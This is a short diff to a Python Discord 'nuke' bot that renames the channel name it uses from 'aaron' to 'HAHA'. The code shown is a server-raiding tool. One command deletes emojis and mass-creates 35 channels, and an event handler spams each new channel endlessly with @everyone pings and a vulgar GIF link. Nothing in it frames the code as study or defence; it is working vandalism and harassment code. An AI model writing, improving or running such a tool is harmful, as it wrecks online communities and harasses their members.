@@ -52,7 +52,7 @@ async def nuke(ctx):
             print(f"{R}[-] Failed to delete emoji :{emoji.name}:")
     for i in range(35):
         try:
-            c = await ctx.guild.create_text_channel("aaron")
+            c = await ctx.guild.create_text_channel("HAHA")
             print(f"{G}[+] Created channel {c.name} [{c.id}]")
         except:
             print(f"{R}[-] Failed to create channel")
@@ -66,7 +66,7 @@ async def nuke(ctx):
 
 @bot.event
 async def on_guild_channel_create(channel):
-    if channel.name == "aaron":
+    if channel.name == "HAHA":
         while True:
             try:
                 await channel.send("@everyone "+random.choice(["https://tenor.com/view/hi-hello-sup-whores-whore-gif-21232848"]))
